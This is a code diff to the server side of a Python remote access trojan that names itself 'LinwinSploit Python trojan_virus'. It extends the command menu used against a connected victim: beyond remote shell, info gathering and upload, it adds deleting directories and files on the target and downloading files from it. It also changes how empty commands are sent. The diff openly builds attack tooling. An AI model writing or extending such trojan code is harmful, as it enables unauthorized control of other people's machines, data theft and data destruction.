@@ -5,14 +5,15 @@ import sys
 HELP = """
 |_LinwinSploit Python trojan_virus_|
 
-1. shell                Send shell command to target.
-2. exit                 Exit from this attack.
-3. getinfo              Get information from target.
-4. mkdir [dir path]     Make a new dictionary.
-5. touch [file path]    Create a new File.
-6. upload [local file]  Upload a local file to the target host.
-
-"""
+1. shell                    Send shell command to target.
+2. exit                     Exit from this attack.
+3. getinfo                  Get information from target.
+4. mkdir [dir path]         Make a new dictionary.
+5. touch [file path]        Create a new File.
+6. upload [local file]      Upload a local file to the target host.
+7. rmdir [dir path]         Delete the dir on the target host.
+8. rmfile [file path]       Delete the file on the target host.
+9. download [file path]     Download a file from target host."""
 
 print(" [INFO] WAIT FOR THE CLIENT CONNECT......")
 tcpserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -51,6 +52,10 @@ while True:
                         print(data.decode("utf-8"))
                     except KeyboardInterrupt:
                         continue
+
+            if command == '':
+                conn.send("none".encode())
+
             else:
                 conn.send(command.encode())
                 continue
